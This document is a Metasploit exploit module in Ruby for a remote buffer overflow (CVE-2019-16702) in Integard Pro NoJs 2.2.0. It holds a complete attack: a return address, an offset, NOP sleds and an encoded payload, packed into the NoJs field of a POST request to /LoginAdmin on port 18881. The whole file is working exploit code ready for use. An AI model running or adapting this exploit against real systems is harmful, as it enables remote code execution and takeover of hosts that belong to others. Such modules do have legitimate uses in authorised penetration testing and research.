
class MetasploitModule < Msf::Exploit::Remote
 
   include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Integard Pro NoJs 2.2.0',
      'Description'    => %q{
        This module exploits a remote buffer overflow in Integard Pro NoJs 2.2.0
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Hans LÃ³pez Mendoza',           
        ],
      'References'     =>
        [
          [ 'CVE', '2019-16702' ],
          [ 'EDB', '47750' ]
        ],
      'Platform'       => 'win',
      'Payload'        =>
        {
          'BadChars' => "\x00\x26\x2f\x3d\x3f\x5c"
        },
      'Targets'        =>
        [
          [ 'Integard Pro NoJs 2.2.0',
            {  
              'Ret' => 0x7e6b30d7, # jmp esp
              'Offset' => 512
            }
          ],
        ],
      'DefaultTarget'  => 0))

    register_options([Opt::RPORT(18881)])

  end

  def exploit
    connect

    print_status("Generating exploit...")  
    evil =  rand_text(target['Offset'])
    evil << [target.ret].pack('V')
    evil << make_nops(100)
    evil << payload.encoded
    evil << make_nops(1500 - evil.length)
        
    sploit =  "Password=eeeee&Redirect=%23%23%23REDIRECT%23%23%23&NoJs="+ evil +"&LoginButtonName=Login\r\n" 
    
    print_status("Triggering the exploit now...")

    res = send_request_cgi({
      'uri' => '/LoginAdmin',
      'method' => 'POST',
      'content-type' => 'application/x-www-form-urlencoded',
      'content-length' => '79',
      'data' => sploit
    })

    handler
    disconnect

  end
end
